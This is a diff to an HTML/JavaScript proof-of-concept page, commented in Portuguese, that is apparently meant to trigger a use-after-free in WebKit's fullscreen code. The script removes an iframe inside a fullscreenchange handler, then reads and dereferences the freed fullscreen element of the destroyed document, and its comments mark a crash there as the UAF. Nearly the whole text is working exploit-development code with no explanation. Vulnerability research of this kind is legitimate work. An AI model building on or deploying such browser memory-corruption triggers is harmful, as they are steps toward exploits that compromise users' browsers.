@@ -5,17 +5,14 @@
 <iframe id="testFrame" width="100" height="100"></iframe>
 <script>
 /*
-  V2.2: iframe.remove() primeiro, depois webkitExitFullscreen() no iDoc salvo.
-  O Document está destruído mas chamamos um método no FullscreenManager
-  que precisa despachar evento para o Element* freed.
-  iDoc é mantido vivo pelo JS wrapper mas o Element interno pode ser freed.
+  V2.2: Lê webkitFullscreenElement do iDoc destruído.
+  Se retornar não-nulo, derefernecia o Element* freed via clientWidth.
 */
 var iframe = document.getElementById("testFrame");
 var popup  = null;
 
 iframe.onload = function() {
-    var iDoc = iframe.contentDocument; // salva referência antes do remove
-
+    var iDoc = iframe.contentDocument;
     iDoc.open();
     iDoc.write(
         '<!DOCTYPE html><html><body>' +
@@ -27,54 +24,44 @@ iframe.onload = function() {
     iDoc.addEventListener('webkitfullscreenchange', function() {
         document.getElementById("status").innerHTML = "child fullscreenchange";
 
-        // Remove primeiro — Document freed
         if (iframe && iframe.parentNode) iframe.remove();
         if (popup && !popup.closed) popup.close();
 
-        // Chama exitFullscreen no Document já destruído
-        // FullscreenManager precisa despachar evento para Element* freed
-        try {
-            iDoc.webkitExitFullscreen();
-            document.getElementById("status").innerHTML += " | exit OK pós-remove";
-        } catch(e) {
-            document.getElementById("status").innerHTML += " | exitEX pós-remove:" + e;
-        }
-
-        // Acessa webkitFullscreenElement do iDoc destruído
+        // Novo: lê dangling pointer do Document destruído
         try {
             var el = iDoc.webkitFullscreenElement;
             document.getElementById("status").innerHTML +=
                 " | fsEl=" + (el ? el.tagName : "null");
             if (el) {
-                // Dereference do Element* possivelmente freed
+                // Dereference do Element* freed — crash aqui = UAF
                 document.getElementById("status").innerHTML +=
                     " clientW=" + el.clientWidth;
             }
         } catch(e) {
-            document.getElementById("status").innerHTML += " | fsElEX:" + e;
+            document.getElementById("status").innerHTML += " | EX:" + e;
         }
     });
+};
 
+document.getElementById("run").onclick = function() {
+    popup = window.open("", "_blank", "width=400,height=300");
+    popup.document.open();
+    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
+    popup.document.close();
+
+    var iDoc = iframe.contentDocument;
     iDoc.documentElement.webkitRequestFullscreen();
 
     setTimeout(function() {
         if (!popup || popup.closed) return;
         popup.focus();
         window.focus();
-        try { iframe.contentWindow.focus(); } catch(e) {}
+        iframe.contentWindow.focus();
+
         setTimeout(function() {
             if (popup && !popup.closed) popup.close();
         }, 300);
     }, 300);
-};
-
-document.getElementById("run").onclick = function() {
-    document.getElementById("status").innerHTML = "iniciando...";
-    popup = window.open("", "_blank", "width=400,height=300");
-    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
-    popup.document.open();
-    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
-    popup.document.close();
 };
 </script>
 </body>
